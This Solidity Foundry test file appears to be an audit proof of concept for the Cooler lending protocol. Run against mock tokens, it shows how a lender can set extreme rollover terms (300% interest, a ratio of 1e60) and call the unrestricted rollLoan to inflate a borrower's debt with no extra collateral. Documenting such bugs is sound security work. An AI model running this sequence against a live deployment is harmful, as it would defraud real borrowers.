// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

// Forge std testing utilities
import {Test} from "forge-std/Test.sol";

// Existing test helpers and mocks that ship with the Cooler repository
import {MockGohm} from "test/mocks/MockGohm.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {UserFactory} from "test/lib/UserFactory.sol";

// Protocol contracts
import {CoolerFactory} from "src/CoolerFactory.sol";
import {Cooler} from "src/Cooler.sol";

/* -------------------------------------------------------------------------- */
/*                                Exploit PoC                                */
/* -------------------------------------------------------------------------- */
/**
 * @notice Proof-of-Concept test that demonstrates how a malicious lender can
 *         unilaterally grief a borrower via provideNewTermsForRoll + rollLoan.
 *
 * Vulnerability synopsis (see annotations/049.txt):
 *   1. The lender can set arbitrarily high `interest` and arbitrarily large
 *      `loanToCollateral` when calling `provideNewTermsForRoll`.
 *   2. `rollLoan` then blindly trusts those parameters:
 *        newDebt  = interestFor(loan.amount, interest, duration)
 *        newColl  = newCollateralFor(loanID)  // uses loanToCollateral
 *   3. By picking:
 *        interest         = 3e18  (=> 300 % APR)
 *        duration         = 365 days (so factor == 1)
 *        loanToCollateral = huge number (e.g. 1e60)
 *      we get:
 *        newDebt  = loan.amount * 3          // debt QUADRUPLES in total
 *        newColl  = 0                       // no extra collateral required
 *
 *   4. The lender may immediately call `rollLoan` himself because the function
 *      has no access control. The borrower suddenly owes 4x the previous debt
 *      with the exact same collateral, an obviously unfair position.
 *
 * This test reproduces the full attack sequence and asserts that:
 *   - `loan.amount` jumps by ~3x with a single lender-initiated transaction.
 *   - `loan.collateral` stays constant (== original collateral).
 */
contract ExploitTest is Test {
    /* --------------------------------- State -------------------------------- */
    MockGohm internal collateral;
    MockERC20 internal debt;

    address internal borrower;
    address internal lender;

    CoolerFactory internal factory;
    Cooler internal cooler;

    /* ---------------------------- Helpful constants ------------------------- */
    uint256 internal constant INITIAL_DEBT_AMOUNT = 1_000 * 1e18;     // Borrow 1,000 debt tokens
    uint256 internal constant INITIAL_INTEREST    = 5e15;             // 0.5% APR (like existing tests)
    uint256 internal constant INITIAL_RATIO       = 10 * 1e18;        // 10 debt : 1 collateral
    uint256 internal constant INITIAL_DURATION    = 365 days;         // 1 year loan

    // Malicious rollover parameters chosen by the lender
    uint256 internal constant MAL_INTEREST  = 3e18;                   // 300% APR
    uint256 internal constant MAL_RATIO     = 1e60;                   // Effectively infinite debt-per-collateral
    uint256 internal constant MAL_DURATION  = 365 days;               // 1 year

    uint256 internal constant DECIMALS = 1e18;

    /* -------------------------------- setUp -------------------------------- */
    function setUp() public {
        // Advance timestamp to non-zero so that rollLoan expiry maths behaves (mirrors upstream tests)
        vm.warp(51 * 365 days);

        // Deploy mock tokens
        collateral = new MockGohm("COLLAT", "COLLAT", 18);
        debt       = new MockERC20("DEBT", "DEBT", 18);

        // Create test actors
        UserFactory uf = new UserFactory();
        address[] memory users = uf.create(2);
        borrower = users[0];
        lender   = users[1];

        // Fund actors with tokens
        deal(address(collateral), borrower, 1_000 * 1e18); // plenty collateral
        deal(address(debt),       lender,   10_000 * 1e18); // plenty debt liquidity

        // Deploy protocol contracts
        factory = new CoolerFactory();

        vm.prank(borrower);
        cooler = Cooler(factory.generateCooler(collateral, debt));
    }

    /* ------------------------------- Exploit -------------------------------- */
    function testMaliciousRollLoanGriefsBorrower() public {
        /* ---------------- Step 1: borrower creates loan request -------------- */
        uint256 requiredCollateral = _collateralFor(INITIAL_DEBT_AMOUNT);

        vm.startPrank(borrower);
        collateral.approve(address(cooler), requiredCollateral);
        uint256 reqID = cooler.requestLoan(
            INITIAL_DEBT_AMOUNT,
            INITIAL_INTEREST,
            INITIAL_RATIO,
            INITIAL_DURATION
        );
        vm.stopPrank();

        /* ---------------- Step 2: lender clears request --------------------- */
        vm.startPrank(lender);
        debt.approve(address(cooler), INITIAL_DEBT_AMOUNT);
        uint256 loanID = cooler.clearRequest(reqID, /*repayDirect=*/true, /*callback=*/false);
        vm.stopPrank();

        // Snapshot the loan state right after origination
        Cooler.Loan memory originalLoan = cooler.getLoan(loanID);
        uint256 originalAmount     = originalLoan.amount;
        uint256 originalCollateral = originalLoan.collateral;

        /* ---------------- Step 3: attacker sets evil terms ------------------ */
        vm.prank(lender);
        cooler.provideNewTermsForRoll(
            loanID,
            MAL_INTEREST,
            MAL_RATIO,
            MAL_DURATION
        );

        // Sanity: newCollateralFor should be zero under our chosen parameters
        uint256 extraCollateral = cooler.newCollateralFor(loanID);
        assertEq(extraCollateral, 0, "Exploit prerequisite failed - additional collateral required");

        /* ---------------- Step 4: attacker immediately rolls loan ----------- */
        vm.prank(lender); // attacker can call - no access control
        cooler.rollLoan(loanID);

        /* ---------------- Step 5: verify exploit impact --------------------- */
        Cooler.Loan memory exploitedLoan = cooler.getLoan(loanID);

        // Collateral must remain unchanged (no extra pledged)
        assertEq(
            exploitedLoan.collateral,
            originalCollateral,
            "Collateral should be unchanged after malicious roll"
        );

        // Debt should have increased roughly 3x (original + newDebt where newDebt≈3×original)
        uint256 expectedNewDebt = cooler.interestFor(originalAmount, MAL_INTEREST, MAL_DURATION);
        uint256 expectedFinalAmount = originalAmount + expectedNewDebt;
        assertEq(
            exploitedLoan.amount,
            expectedFinalAmount,
            "Debt did not inflate as expected - exploit unsuccessful"
        );
    }

    /* --------------------------- Helper functions --------------------------- */
    function _collateralFor(uint256 debtAmount) internal pure returns (uint256) {
        return (debtAmount * DECIMALS) / INITIAL_RATIO; // mirrors Cooler.collateralFor logic
    }
}
